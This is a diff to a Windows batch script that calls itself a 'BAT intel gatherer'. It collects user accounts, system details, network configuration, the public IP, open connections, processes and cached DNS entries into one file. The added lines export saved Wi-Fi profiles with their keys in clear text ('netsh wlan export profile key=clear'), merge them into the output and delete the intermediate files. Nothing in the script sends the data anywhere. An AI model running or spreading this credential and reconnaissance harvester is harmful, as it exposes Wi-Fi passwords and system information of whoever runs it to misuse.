@@ -5,16 +5,14 @@ COLOR C
 net user > userinfo.txt
 systeminfo > sysinfo.txt
 ipconfig /all > ipinfo.txt
-netsh wlan show profiles > networkinfo.txt
 nslookup myip.opendns.com resolver1.opendns.com > publicip.txt
+netsh wlan show profiles > networkinfo.txt
 netstat -aon > portscan.txt
 tasklist > tasklist.txt
 ipconfig /displaydns > history.txt
-copy/b *txt systeminfo.txt
-
-REM BAT intel gatherer by syswriath.
-REM https://syswriath.github.io/
-REM https://github.com/syswriath
+netsh wlan export profile key=clear
+copy/b *txt infosofar.txt
+copy/b *xml netshinfosofar.txt
 
 del userinfo.txt
 del sysinfo.txt
@@ -24,8 +22,17 @@ del publicip.txt
 del portscan.txt
 del tasklist.txt
 del history.txt
-cls
+del *.xml
 
+copy/b *txt systeminfo.txt
+del infosofar.txt
+del netshinfosofar.txt
+
+REM BAT intel gatherer by syswriath.
+REM https://syswriath.github.io/
+REM https://github.com/syswriath
+
+CLS
 ECHO AND THE BAT LIVES TO SEE YET ANOTHER DAY!
 ECHO	        _,    _   _    ,_
 ECHO	   .o888P     Y8o8Y     Y888o.
